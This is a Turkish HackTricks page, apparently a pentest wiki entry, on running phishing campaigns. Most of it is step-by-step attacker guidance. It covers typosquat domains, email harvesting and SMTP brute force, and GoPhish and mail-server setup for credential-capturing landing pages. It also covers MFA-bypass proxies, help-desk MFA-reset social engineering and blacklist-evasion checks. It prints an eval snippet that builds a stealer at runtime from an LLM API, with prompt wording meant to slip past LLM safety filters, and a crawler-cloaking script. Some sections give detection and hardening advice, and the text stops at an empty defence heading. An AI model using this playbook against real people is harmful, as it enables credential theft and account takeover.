# Phishing Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Metodoloji

1. Hedefi keşfet
1. Kurban **victim domain**'ini seç.
2. Kurbanın kullandığı **login portalları** için bazı temel web keşifleri yap ve hangi portalı **taklit edeceğine** **karar ver**.
3. Emailleri **bulmak** için bazı **OSINT** teknikleri kullan.
2. Ortamı hazırla
1. Phishing değerlendirmesi için kullanacağın **domain**i **satın al**
2. Email servisi ile ilgili kayıtları yapılandır (SPF, DMARC, DKIM, rDNS)
3. VPS'i **gophish** ile yapılandır
3. Kampanyayı hazırla
1. **Email şablonunu** hazırla
2. Kimlik bilgilerini çalmak için **web sayfasını** hazırla
4. Kampanyayı başlat!

## Benzer domain adları oluşturma veya güvenilir bir domain satın alma

### Domain Name Variation Techniques

- **Keyword**: Domain adı orijinal domainin önemli bir **keyword**ünü içerir (ör. zelster.com-management.com).
- **hypened subdomain**: Bir subdomaindeki **noktayla tireyi değiştir** (ör. www-zelster.com).
- **New TLD**: Aynı domaini **yeni bir TLD** ile kullanma (ör. zelster.org)
- **Homoglyph**: Domain adındaki bir harfi **benzer görünen harflerle** **değiştirir** (ör. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain adındaki iki harfi **yer değiştirir** (ör. zelsetr.com).
- **Singularization/Pluralization**: Domain adının sonuna “s” ekler veya çıkarır (ör. zeltsers.com).
- **Omission**: Domain adından bir harfi **çıkarır** (ör. zelser.com).
- **Repetition:** Domain adındaki bir harfi **tekrarlar** (ör. zeltsser.com).
- **Replacement**: Homoglyph'e benzer ama daha az gizli. Domain adındaki harflerden birini, klavyede orijinal harfe yakın bir harfle değiştirir (ör. zektser.com).
- **Subdomained**: Domain adına bir **nokta** ekler (ör. ze.lster.com).
- **Insertion**: Domain adının içine bir harf **ekler** (ör. zerltser.com).
- **Missing dot**: TLD'yi domain adına ekler. (ör. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Depolanan veya iletişim halindeki bazı bitlerin, güneş patlamaları, kozmik ışınlar veya donanım hataları gibi çeşitli faktörler nedeniyle otomatik olarak **fliplenme** ihtimali vardır.

Bu kavram **DNS isteklerine uygulandığında**, **DNS sunucusunun aldığı domain** ile başlangıçta istenen domain aynı olmayabilir.

Örneğin, "windows.com" domainindeki tek bir bit değişikliği onu "windnws.com" yapabilir.

Saldırganlar, kurbanın domainine benzer **birkaç bit-flipping domaini kaydederek** bundan **faydalanabilirler**. Amaçları meşru kullanıcıları kendi altyapılarına yönlendirmektir.

Daha fazla bilgi için oku: [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Güvenilir bir domain satın alma

Kullanabileceğin expired domainleri bulmak için [https://www.expireddomains.net/](https://www.expireddomains.net) adresinde arama yapabilirsin.\
Satın almayı planladığın expired domainin **zaten iyi bir SEO'ya sahip** olduğundan emin olmak için nasıl kategoriz edildiğini şu kaynaklardan kontrol edebilirsin:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Email Keşfi

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Daha fazla geçerli email adresi **keşfetmek** veya zaten keşfettiğin adresleri **doğrulamak** için, kurbanın smtp sunucularına username brute-force yapıp yapamayacağını kontrol edebilirsin. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ayrıca, kullanıcılar **maillerine erişmek için herhangi bir web portalı** kullanıyorsa, portalın **username brute force**'a karşı savunmasız olup olmadığını kontrol etmeyi ve mümkünse bu açığı istismar etmeyi unutma.

## GoPhish Yapılandırması

### Installation

Şunu indir: [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

İndirip `/opt/gophish` içine sıkıştırılmış dosyayı aç ve `/opt/gophish/gophish`'i çalıştır.\
Çıktıda admin kullanıcı için port 3333'te kullanılacak bir şifre verilecektir. Bu nedenle o porta erişip bu kimlik bilgilerini kullanarak admin şifresini değiştir. Muhtemelen o portu lokaline tunnellemen gerekecektir:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**TLS sertifikası yapılandırması**

Bu adımdan önce kullanacağınız **alan adını zaten satın almış** olmalısınız ve bu alan adı, **gophish**'ı yapılandırdığınız **VPS**'nin **IP**'ine **yönlendirilmiş** olmalıdır.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail yapılandırması**

Yüklemeye başlayın: `apt-get install postfix`

Daha sonra alan adını aşağıdaki dosyalara ekleyin:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf içindeki aşağıdaki değişkenlerin değerlerini de değiştirin**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Son olarak **`/etc/hostname`** ve **`/etc/mailname`** dosyalarını alan adınızla değiştirin ve **VPS'inizi yeniden başlatın.**

Şimdi, `mail.<domain>` için VPS'nin **ip address**'ine işaret eden bir **DNS A record** oluşturun ve `mail.<domain>`'i işaret eden bir **DNS MX** kaydı ekleyin.

Şimdi bir e-posta göndermeyi test edelim:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish yapılandırması**

gophish'in yürütmesini durdurun ve yapılandırmaya başlayalım.\
`/opt/gophish/config.json` dosyasını aşağıdaki şekilde değiştirin (https kullanıldığına dikkat):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish servisini yapılandırma**

gophish servisini otomatik olarak başlatılabilir ve bir servis olarak yönetilebilir hale getirmek için aşağıdaki içeriğe sahip `/etc/init.d/gophish` dosyasını oluşturabilirsiniz:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Servisi yapılandırmayı tamamlayın ve aşağıdakileri yaparak kontrol edin:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mail sunucusu ve alan adı yapılandırması

### Bekle & meşru ol

Bir alan adı ne kadar eskiyse spam olarak yakalanma olasılığı o kadar düşüktür. Bu yüzden phishing değerlendirmesinden önce mümkün olduğunca (en az 1 hafta) beklemelisiniz. Ayrıca, itibar gerektiren bir sektör hakkında bir sayfa eklerseniz elde edeceğiniz itibar daha iyi olur.

Bir hafta beklemek zorunda olsanız bile her şeyi şimdi yapılandırmayı bitirebileceğinizi unutmayın.

### Reverse DNS (rDNS) kaydı yapılandırma

VPS'nin IP adresini alan adına çözecek bir rDNS (PTR) kaydı ayarlayın.

### Sender Policy Framework (SPF) Kaydı

You must **configure a SPF record for the new domain**. If you don't know what is a SPF record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

SPF politikanızı oluşturmak için [https://www.spfwizard.net/](https://www.spfwizard.net) adresini kullanabilirsiniz (VPS makinesinin IP'sini kullanın)

![](<../../images/image (1037).png>)

Bu, alan adının içinde bir TXT kaydına eklenmesi gereken içeriktir:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Kaydı

Yeni alan için bir **DMARC kaydı yapılandırmalısınız**. Eğer bir DMARC kaydının ne olduğunu bilmiyorsanız [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Aşağıdaki içeriğe sahip olacak şekilde `_dmarc.<domain>` host adına işaret eden yeni bir DNS TXT kaydı oluşturmalısınız:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

You must **DKIM yapılandırması yapmalısınız**. If you don't know what is a DMARC record [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> DKIM anahtarının oluşturduğu her iki B64 değerini birleştirmeniz gerekir:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### E-posta yapılandırma puanınızı test edin

Bunu [https://www.mail-tester.com/](https://www.mail-tester.com) kullanarak yapabilirsiniz\
Sadece sayfaya gidin ve size verdikleri adrese bir e-posta gönderin:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ayrıca `check-auth@verifier.port25.com` adresine bir e-posta göndererek **e-posta yapılandırmanızı kontrol edebilirsiniz** ve yanıtı **okuyabilirsiniz** (bunun için **25** numaralı portu **açmanız** ve e-postayı root olarak gönderirseniz yanıtı _/var/mail/root_ dosyasında görmeniz gerekir).\
Tüm testleri geçtiğinizden emin olun:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ayrıca **kontrolünüzdeki bir Gmail hesabına mesaj gönderebilir**, Gmail gelen kutunuzdaki **e-posta başlıklarını** kontrol edebilirsiniz; `Authentication-Results` başlık alanında `dkim=pass` bulunmalıdır.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhouse Kara Listesinden Kaldırma

[www.mail-tester.com](https://www.mail-tester.com) sayfası, alan adınızın Spamhouse tarafından engellenip engellenmediğini gösterebilir. Alan adınızın/IP'nizin kaldırılmasını şu adresten talep edebilirsiniz: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Kara Listesinden Kaldırma

Alan adınızın/IP'nizin kaldırılmasını şu adresten talep edebilirsiniz: [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Gönderici profilini tanımlamak için bir **isim** belirleyin
- Hangi hesaptan phishing e-postalarını göndereceğinize karar verin. Öneriler: _noreply, support, servicedesk, salesforce..._
- Kullanıcı adı ve şifreyi boş bırakabilirsiniz, ancak **Ignore Certificate Errors** seçeneğini işaretlediğinizden emin olun

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Her şeyin çalıştığını test etmek için "**Send Test Email**" işlevini kullanmanız önerilir.\
> Test yaparken kara listeye alınmamak için **test e-postalarını 10min mails adreslerine göndermenizi** öneririm.

### Email Template

- Şablonu tanımlamak için bir **isim** belirleyin
- Ardından bir **konu** yazın (tuhaf olmayan, normal bir e-postada görebileceğiniz bir şey)
- Mutlaka "**Add Tracking Image**" seçeneğini işaretlediğinizden emin olun
- **E-posta şablonunu** yazın (aşağıdaki örnekteki gibi değişkenler kullanabilirsiniz):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Not: E-postanın güvenilirliğini artırmak için, müşteriden alınmış bir e-posta imzası kullanmanız önerilir. Öneriler:

- Var olmayan bir adrese bir e-posta gönderin ve gelen yanıtta herhangi bir imza olup olmadığını kontrol edin.
- info@ex.com veya press@ex.com ya da public@ex.com gibi kamuya açık e-posta adreslerini arayın, onlara bir e-posta gönderin ve yanıtı bekleyin.
- Bulduğunuz bazı geçerli e-posta adresleriyle iletişime geçmeyi deneyin ve yanıtı bekleyin.

![](<../../images/image (80).png>)

> [!TIP]
> Email Template ayrıca **gönderilecek dosyalar eklemeye** de izin verir. Eğer özel hazırlanmış dosya/belgeler kullanarak NTLM challenge'larını çalmak istiyorsanız [bu sayfayı okuyun](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Bir **name** yazın
- Web sayfasının **HTML code**unu yazın. Web sayfalarını **import** edebileceğinizi unutmayın.
- **Capture Submitted Data** ve **Capture Passwords** seçeneklerini işaretleyin
- Bir **redirection** ayarlayın

![](<../../images/image (826).png>)

> [!TIP]
> Genellikle sayfanın HTML kodunu değiştirmeniz ve yerelde (ör. bir Apache sunucusu kullanarak) bazı testler yapmanız gerekecektir; sonuçtan memnun kalana kadar. Sonra o HTML kodunu kutuya yapıştırın.  
> Not: HTML için bazı statik kaynaklar kullanmanız gerekirse (ör. CSS ve JS dosyaları), bunları _**/opt/gophish/static/endpoint**_ içine kaydedip sonra _**/static/\<filename>**_ üzerinden erişebilirsiniz.

> [!TIP]
> Redirection için kullanıcıları hedefin gerçek ana web sayfasına yönlendirebilir veya örneğin _/static/migration.html_ adresine yönlendirip, 5 saniye boyunca bir **spinning wheel** ([**https://loading.io/**](https://loading.io)) gösterdikten sonra işlemin başarılı olduğunu belirtebilirsiniz.

### Users & Groups

- Bir isim belirleyin
- Verileri **import** edin (örnek şablonun çalışması için her kullanıcı için firstname, last name ve email address gerekli olduğunu unutmayın)

![](<../../images/image (163).png>)

### Campaign

Son olarak, bir name, email template, landing page, URL, sending profile ve group seçerek bir campaign oluşturun. URL'nin mağdurlara gönderilecek link olacağını unutmayın.

Not: **Sending Profile** test e-postası göndermenize izin vererek son phishing e-postasının nasıl görüneceğini görmenizi sağlar:

![](<../../images/image (192).png>)

> [!TIP]
> Testleri yaparken kara listeye düşmemek için test e-postalarını 10min mails adreslerine göndermenizi öneririm.

Her şey hazır olduğunda kampanyayı başlatın!

## Website Cloning

Eğer herhangi bir nedenle web sitesini klonlamak isterseniz şu sayfayı kontrol edin:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bazı phishing değerlendirmelerinde (özellikle Red Teams için) ayrıca **bir tür backdoor içeren dosyalar göndermek** isteyebilirsiniz (örneğin bir C2 veya sadece bir kimlik doğrulamayı tetikleyecek bir şey).  
Bazı örnekler için aşağıdaki sayfaya bakın:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Önceki saldırı, gerçek bir web sitesini taklit edip kullanıcının girdiği bilgileri topladığınız için oldukça zekicedir. Ne yazık ki, kullanıcı doğru parolayı girmediyse veya taklit ettiğiniz uygulama 2FA ile yapılandırılmışsa, **bu bilgiler sizi kandırılmış kullanıcı olarak taklit edebilmeniz için yeterli olmaz**.

Bu noktada [**evilginx2**](https://github.com/kgretzky/evilginx2), [**CredSniper**](https://github.com/ustayready/CredSniper) ve [**muraena**](https://github.com/muraenateam/muraena) gibi araçlar işe yarar. Bu araçlar bir MitM tarzı saldırı oluşturmanızı sağlar. Temelde saldırı şu şekilde işler:

1. Gerçek web sayfasının oturum açma formunu **taklit edersiniz**.
2. Kullanıcı sahte sayfanıza **kimlik bilgilerini gönderir** ve araç bunları gerçek web sayfasına göndererek **kimlik bilgileri çalışıyor mu diye kontrol eder**.
3. Hesap **2FA** ile yapılandırılmışsa, MitM sayfası bunu isteyecek ve kullanıcı bunu **girdiğinde**, araç bunu gerçek web sayfasına iletir.
4. Kullanıcı kimlik doğrulandıktan sonra siz (saldırgan) MitM sürerken gerçekleştirilen her etkileşimin **kimlik bilgilerini, 2FA'yı, cookie'yi ve tüm bilgilerini** ele geçirmiş olursunuz.

### Via VNC

Kullanıcıyı orijinal siteyle aynı görünen kötü amaçlı bir sayfaya göndermek yerine ona gerçek web sayfasına bağlı bir tarayıcıyla bir **VNC oturumu** gönderirseniz ne olur? Ne yaptığını görebilir, parolayı, kullanılan MFA'yı, çerezleri çalabilirsiniz...  
Bunu [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) ile yapabilirsiniz

## Detecting the detection

Açıkça, yakalandığınızı bilmenin en iyi yollarından biri domaininizi **blacklist'lerde aramaktır**. Eğer listelenmişse, bir şekilde domaininiz şüpheli olarak tespit edilmiştir.  
Domaininizin herhangi bir blacklist'te görünüp görünmediğini kontrol etmenin kolay yollarından biri [https://malwareworld.com/](https://malwareworld.com) kullanmaktır.

Ancak, mağdurun dünyadaki şüpheli phishing etkinliklerini **aktif olarak arayıp aramadığını** bilmenin başka yolları da vardır; bunu şu sayfada açıklandığı gibi:


{{#ref}}
detecting-phising.md
{{#endref}}

Çok benzer isimli bir domain **satın alabilir** ve/veya sizin kontrolünüzdeki bir domainin **subdomain**i için mağdurun domaininin **anahtar kelimesini içeren** bir sertifika **üretebilirsiniz**. Eğer **mağdur** bu domainlerle herhangi bir **DNS veya HTTP etkileşimi** gerçekleştirirse, bu onun şüpheli domainleri **aktif olarak aradığını** gösterecek ve çok daha gizli hareket etmeniz gerekecektir.

### Evaluate the phishing

E-postanızın spam klasörüne düşüp düşmeyeceğini, engelleneceğini ya da başarılı olup olmayacağını değerlendirmek için [**Phishious**](https://github.com/Rices/Phishious) kullanın.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern saldırı grupları giderek e-posta tuzaklarını tamamen atlayıp **doğrudan service-desk / identity-recovery iş akışını** hedef alarak MFA'yı devre dışı bırakıyor. Saldırı tamamen "living-off-the-land": operatör geçerli kimlik bilgilerini ele geçirince yerleşik admin araçlarıyla pivot yapar – herhangi bir zararlı yazılım gerekmez.

### Attack flow
1. Hedefi keşfetme
* LinkedIn, veri sızıntıları, kamuya açık GitHub vb. üzerinden kişisel ve kurumsal bilgileri toplayın.
* Yüksek değerli kimlikleri (yöneticiler, IT, finans) belirleyin ve parola / MFA sıfırlama için **tam servis-desk sürecini** numaralandırın.
2. Gerçek zamanlı sosyal mühendislik
* Hedefin kimliğine bürünerek help-desk'i telefon, Teams veya chat ile arayın (çoğu zaman **spoofed caller-ID** veya **cloned voice** ile).
* Bilgi tabanlı doğrulamayı geçmek için önceden toplanmış PII'yi verin.
* Temsilciyi **MFA secret'ını sıfırlamaya** veya kayıtlı bir mobil numara üzerinde **SIM-swap** yapmaya ikna edin.
3. Erişim sonrası hemen yapılacaklar (gerçek vakalarda ≤60 dk)
* Herhangi bir web SSO portalı üzerinden foothold oluşturun.
* AD / AzureAD'yi yerleşik araçlarla keşfedin (binary bırakılmadan):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Ortak hareket için **WMI**, **PsExec** veya ortamda zaten beyaz listede olan meşru **RMM** ajanlarını kullanın.

### Detection & Mitigation
* Help-desk identity recovery işlemini **ayrıcalıklı bir operasyon** olarak ele alın – step-up auth ve yönetici onayı gerektirin.
* Aşağıdakileri tetikleyen **Identity Threat Detection & Response (ITDR)** / **UEBA** kuralları dağıtın:
* MFA yöntemi değişti + yeni cihaz / coğrafyadan kimlik doğrulama.
* Aynı yetkili hesabın (user→admin) anında yükselmesi.
* Help-desk aramalarını kaydedin ve herhangi bir sıfırlama öncesi **zaten kayıtlı bir numaraya call-back** zorunlu kılın.
* Yeni sıfırlanan hesapların **otomatik olarak yüksek ayrıcalıklı token**lar edinmemesi için **Just-In-Time (JIT) / Privileged Access** uygulayın.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Kitlesel ekipler, yüksek temaslı operasyonların maliyetini arama motorlarını ve reklam ağlarını teslimat kanalı haline getiren geniş ölçekli saldırılarla dengeleyebilir.

1. **SEO poisoning / malvertising** yanlış bir sonuç (ör. `chromium-update[.]site`) üst reklamlara iteler.
2. Mağdur küçük bir **first-stage loader** (çoğunlukla JS/HTA/ISO) indirir. Unit 42 tarafından görülen örnekler:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader tarayıcı çerezlerini + credential DB'lerini exfiltrate eder, sonra sessiz bir loader çeker ve bu loader gerçek zamanlı olarak şu kararı verir:
* RAT (ör. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Yeni kayıt edilmiş domainleri engelleyin ve *search-ads* için gelişmiş DNS / URL Filtering zorunlu kılın.
* Yazılım kurulumunu imzalı MSI / Store paketleri ile sınırlayın, politika ile `HTA`, `ISO`, `VBS` çalıştırılmasını engelleyin.
* Tarayıcıların çocuk süreçlerinin installer açtığını izleyin:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* İlk aşama loader'ların sıkça istismar ettiği LOLBins için avlanın (ör. `regsvr32`, `curl`, `mshta`).

---

## AI-Enhanced Phishing Operations
Saldırganlar artık tamamen kişiselleştirilmiş tuzaklar ve gerçek zamanlı etkileşim için **LLM & voice-clone API'lerini** birbirine zincirliyor.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Otomasyon|>100k e-posta / SMS üretip gönderme; rastgeleleştirilmiş ifadeler ve takip linkleri.|
|Üretken AI|Kamuya açık M&A, sosyal medyadan iç şakalar referanslı tek seferlik e-postalar üretme; callback dolandırıcılığında deep-fake CEO sesi.|
|Agentik AI|Otonom olarak domain kaydı, OSINT kazıma, bir mağdur tıklayıp kimlik bilgilerini göndermediğinde sonraki aşama maillerini hazırlama.|

**Savunma:**
• ARC/DKIM anomalileri üzerinden gelen güvensiz otomasyon mesajlarını vurgulayan **dynamic banners** ekleyin.  
• Yüksek riskli telefon talepleri için **voice-biometric challenge phrases** dağıtın.  
• Farkındalık programlarında AI tarafından üretilmiş tuzakları sürekli simüle edin – statik şablonlar artık geçerli değil.

Ayrıca bkz – credential phishing için agentic browsing abuse:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Ayrıca bkz – secrets envanteri ve tespiti için yerel CLI araçlarının ve MCP'nin AI agent tarafından kötüye kullanımı:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Saldırganlar görünüşte zararsız HTML gönderip **çalışma zamanında stealer'ı üretebilir**; bir **trusted LLM API**'den JavaScript isteyip bunu tarayıcıda yürütürler (ör. `eval` veya dinamik `<script>`).

1. **Prompt-as-obfuscation:** exfil URL'lerini/Base64 dizelerini prompt içinde kodlayın; güvenlik filtrelerini atlatmak ve halüsinasyonları azaltmak için ifadeyi yineleyin.
2. **Client-side API call:** yüklenince JS kamuya açık bir LLM'e (Gemini/DeepSeek/etc.) veya bir CDN proxy'sine çağrı yapar; statik HTML'de sadece prompt/API çağrısı vardır.
3. **Assemble & exec:** yanıtı birleştirip yürütün (ziyaret başına polimorfik):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** üretilen code yem'i kişiselleştirir (ör. LogoKit token parsing) ve creds'i prompt-hidden endpoint'e gönderir.

**Evasion traits**
- Trafik, iyi bilinen LLM domain'lerine veya saygın CDN proxy'lerine gider; bazen WebSockets aracılığıyla bir backend'e.
- Statik payload yok; kötü amaçlı JS yalnızca render'dan sonra var olur.
- Deterministik olmayan üretimler, her oturum için benzersiz stealers üretir.

**Detection ideas**
- JS etkin sandbox'ları çalıştırın; LLM yanıtlarından kaynaklanan runtime `eval`/dynamic script creation'ı işaretleyin.
- LLM API'lerine yapılan ve hemen ardından dönen metin üzerinde `eval`/`Function` kullanılan front-end POST'larını araştırın.
- İstemci trafiğinde yetkisiz LLM domain'leri tespit edildiğinde ve sonrasında credential POST'ları yapıldığında alarm verin.

---

## MFA Fatigue / Push Bombing Varyantı – Zorla Sıfırlama
Klasik push-bombing'in yanı sıra, operatörler yardım masası çağrısı sırasında basitçe **yeni bir MFA kaydı zorlar**, kullanıcının mevcut token'ını geçersiz kılarlar. Sonraki herhangi bir giriş istemi kurbana meşru görünür.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.

## Clipboard Hijacking / Pastejacking

Saldırganlar, ele geçirilmiş veya typosquatted bir web sayfasından kurbanın clipboard'una zararlı komutları sessizce kopyalayabilir ve ardından kullanıcıyı bunları **Win + R**, **Win + X** veya bir terminal penceresine yapıştırmaya kandırarak herhangi bir indirme veya ek olmaksızın keyfi kod çalıştırabilir.

{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatörler phishing akışlarını basit bir cihaz kontrolünün arkasına koyarak masaüstü crawlers'ın son sayfalara ulaşmasını engelliyor. Yaygın bir desen, touch-capable DOM'u test eden ve sonucu bir server endpoint'ine post eden küçük bir script'tir; non‑mobile clients HTTP 500 (veya boş bir sayfa) alırken, mobile kullanıcılar tam akışa erişir.

Minimal client snippet (tipik mantık):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` mantığı (basitleştirilmiş):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Sık gözlemlenen sunucu davranışı:
- İlk yüklemede bir session cookie ayarlar.
- `POST /detect {"is_mobile":true|false}` isteğini kabul eder.
- `is_mobile=false` olduğunda takip eden GET'lere 500 (veya placeholder) döner; yalnızca `true` ise phishing sunar.

Avlama ve tespit heuristikleri:
- urlscan sorgusu: `filename:"detect_device.js" AND page.status:500`
- Web telemetri: `GET /static/detect_device.js` → `POST /detect` → non‑mobile için HTTP 500 sıralaması; meşru mobil hedef yolları takip eden HTML/JS ile 200 döner.
- İçeriği yalnızca `ontouchstart` veya benzeri cihaz kontrollerine göre koşullayan sayfaları engelleyin veya dikkatle inceleyin.

Savunma ipuçları:
